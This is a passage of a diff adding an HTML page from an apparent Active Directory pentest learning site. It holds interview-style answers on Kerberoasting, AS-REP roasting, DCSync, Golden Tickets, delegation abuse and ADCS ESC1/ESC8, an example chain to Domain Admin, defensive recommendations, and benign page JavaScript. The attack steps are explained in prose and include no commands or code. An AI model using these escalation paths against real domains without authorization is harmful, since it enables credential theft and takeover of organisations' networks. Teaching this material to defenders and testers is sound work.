+        <div class="accordion-body">
+          <p>1. All domain users and their properties. 2. Domain groups, especially Domain Admins. 3. Users with SPNs (Kerberoastable). 4. Users without preauth (AS-REP roastable). 5. BloodHound collection — the graph is the fastest way to find paths.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">3. What is DCSync and when can you perform it?</div>
+        <div class="accordion-body">
+          <p>DCSync mimics a Domain Controller using the DRS protocol to replicate AD data — including password hashes. You can perform it if you have Replicating Directory Changes and Replicating Directory Changes All permissions (or the Replicating Directory Changes in Filtered Set extended right).</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">4. Why is the krbtgt account so important?</div>
+        <div class="accordion-body">
+          <p>krbtgt is the Kerberos service account for the KDC. Its NTLM hash is used to encrypt TGTs. If you have the krbtgt hash, you can forge Golden Tickets — unlimited, persistent access to any service in the domain.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">5. What is RBCD and how does it differ from unconstrained delegation?</div>
+        <div class="accordion-body">
+          <p><strong>RBCD (Resource-Based Constrained Delegation):</strong> Set on the target resource — you control <em>who can delegate to this service</em>. Exploitable if you can write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. <strong>Unconstrained Delegation:</strong> Set on a service — it caches the TGT of any user who authenticates to it. Exploited by compromising that service and capturing a DA's TGT.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">6. What are ESC1 and ESC8 in ADCS?</div>
+        <div class="accordion-body">
+          <p><strong>ESC1:</strong> A template allows the requester to specify a SAN (Subject Alternative Name) — you can request a certificate for any user, including Domain Admin. <strong>ESC8:</strong> NTLM relay to the ADCS HTTP enrollment endpoint — coercing a DC to authenticate lets you get a DC certificate.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">7. Describe a realistic AD chain using three findings.</div>
+        <div class="accordion-body">
+          <p>Example: (1) A service account has an SPN → Kerberoast it. (2) Crack its password offline. (3) That service account has GenericAll over the Domain Admins group → Add yourself to Domain Admins → Domain Admin.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">8. What defensive measures would you recommend to a customer?</div>
+        <div class="accordion-body">
+          <p>1. Strong passwords on service accounts (25+ chars) or gMSAs. 2. Enforce Kerberos preauth on all accounts. 3. Audit and minimize ACLs. 4. Disable NTLM where possible. 5. Restrict DCSync rights. 6. Harden ADCS templates. 7. Monitor AD events (4768, 4769, 4662, 5136). 8. Use tiered admin model.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== AUTHOR FOOTER ==================== -->
+    <section class="section" id="author">
+      <div class="author-footer">
+        <h3>⚡ Built & Maintained By</h3>
+        <div class="author-name">Chandan Kumar</div>
+        <p class="tagline">
+          Cybersecurity enthusiast · Ethical Hacker · Pentester<br>
+          Creating practical, deep security learning resources for the community.
+        </p>
+        <div class="author-links">
+          <a href="https://linkedin.com/in/chandan-kumar-eh" target="_blank" rel="noopener" class="author-link linkedin">
+            <span class="icon">💼</span> LinkedIn
+          </a>
+          <a href="https://medium.com/@chandan20516" target="_blank" rel="noopener" class="author-link medium">
+            <span class="icon">✍️</span> Medium
+          </a>
+          <a href="https://github.com/chandan-44" target="_blank" rel="noopener" class="author-link github">
+            <span class="icon">🐙</span> GitHub
+          </a>
+        </div>
+        <p style="margin-top:1.5rem; font-size:0.8rem; color: var(--text-dim);">
+          © 2025 Chandan Kumar · Active Directory Attack Academy<br>
+          For authorized educational use only.
+        </p>
+      </div>
+    </section>
+
+    <div class="nav-buttons">
+      <button onclick="navigateSection('prev')">← Previous</button>
+      <button onclick="navigateSection('next')">Next →</button>
+    </div>
+
+  </div>
+
+  <button id="backToTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    const themeToggle = document.getElementById('themeToggle');
+    const html = document.documentElement;
+
+    themeToggle.addEventListener('click', () => {
+      const current = html.getAttribute('data-theme');
+      const next = current === 'dark' ? 'light' : 'dark';
+      html.setAttribute('data-theme', next);
+      themeToggle.textContent = next === 'dark' ? '🌙 Dark' : '☀️ Light';
+    });
+
+    const navLinks = document.querySelectorAll('.nav-link');
+    const sections = document.querySelectorAll('.section');
+
+    navLinks.forEach(link => {
+      link.addEventListener('click', () => {
+        const targetId = link.getAttribute('data-target');
+        const target = document.getElementById(targetId);
+        if (target) {
+          target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          navLinks.forEach(l => l.classList.remove('active'));
+          link.classList.add('active');
+          if (window.innerWidth <= 900) {
+            document.getElementById('sidebar').classList.remove('open');
+          }
+        }
+      });
+    });
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          const id = entry.target.id;
+          navLinks.forEach(link => {
+            link.classList.toggle('active', link.getAttribute('data-target') === id);
+          });
+        }
+      });
+    }, { threshold: 0.2 });
+
+    sections.forEach(section => observer.observe(section));
+
+    window.addEventListener('scroll', () => {
+      const scrollTop = window.scrollY;
+      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+      const progress = (scrollTop / docHeight) * 100;
+      document.getElementById('progressBar').style.width = progress + '%';
+    });
+
+    window.addEventListener('scroll', () => {
+      const btn = document.getElementById('backToTop');
+      btn.style.display = window.scrollY > 400 ? 'flex' : 'none';
+    });
+
+    document.querySelectorAll('.accordion-header').forEach(header => {
+      header.addEventListener('click', () => {
+        header.parentElement.classList.toggle('open');
+      });
+    });
+
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const tabId = btn.getAttribute('data-tab');
+        const parent = btn.closest('.tabs');
+        parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        const container = parent.parentElement;
+        container.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        const target = document.getElementById(tabId);
+        if (target) target.classList.add('active');
+      });
+    });
+
+    function copyCode(btn) {
+      const codeBlock = btn.closest('.code-block');
+      const pre = codeBlock.querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = '✓ Copied';
+        setTimeout(() => btn.textContent = 'Copy', 1500);
+      }).catch(() => {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        btn.textContent = '✓ Copied';
+        setTimeout(() => btn.textContent = 'Copy', 1500);
+      });
+    }
+
+    const searchInput = document.getElementById('searchInput');
+    searchInput.addEventListener('input', function() {
+      const query = this.value.toLowerCase().trim();
+      document.querySelectorAll('.highlight').forEach(el => {
+        const parent = el.parentNode;
+        parent.replaceChild(document.createTextNode(el.textContent), el);
+        parent.normalize();
+      });
+
+      if (query.length < 2) return;
+
+      const walker = document.createTreeWalker(
+        document.getElementById('main'),
+        NodeFilter.SHOW_TEXT,
+        null,
+        false
+      );
+
+      const textNodes = [];
+      while (walker.nextNode()) {
+        textNodes.push(walker.currentNode);
+      }
+
+      textNodes.forEach(node => {
+        const text = node.textContent;
+        const lower = text.toLowerCase();
+        const index = lower.indexOf(query);
+        if (index !== -1) {
+          const range = document.createRange();
+          range.setStart(node, index);
+          range.setEnd(node, index + query.length);
+          const span = document.createElement('span');
+          span.className = 'highlight';
+          range.surroundContents(span);
+        }
+      });
+    });
+
+    document.getElementById('menuToggle').addEventListener('click', () => {
+      document.getElementById('sidebar').classList.toggle('open');
+    });
+
+    function navigateSection(direction) {
+      const allSections = Array.from(document.querySelectorAll('.section'));
+      const currentScroll = window.scrollY;
+      let currentIndex = 0;
+      for (let i = 0; i < allSections.length; i++) {
+        if (allSections[i].offsetTop <= currentScroll + 100) {
+          currentIndex = i;
+        }
+      }
+      let nextIndex;
+      if (direction === 'next') {
+        nextIndex = Math.min(currentIndex + 1, allSections.length - 1);
+      } else {
+        nextIndex = Math.max(currentIndex - 1, 0);
+      }
+      allSections[nextIndex].scrollIntoView({ behavior: 'smooth' });
+    }
+
+    document.querySelectorAll('.checklist input[type="checkbox"]').forEach((cb, index) => {
+      const key = 'ad-check-' + index;
+      const saved = localStorage.getItem(key);
+      if (saved !== null) {
+        cb.checked = saved === 'true';
+      }
+      cb.addEventListener('change', () => {
+        localStorage.setItem(key, cb.checked);
+      });
+    });
+
+    document.querySelector('.accordion')?.classList.add('open');
+  </script>
+
+</body>
+</html>
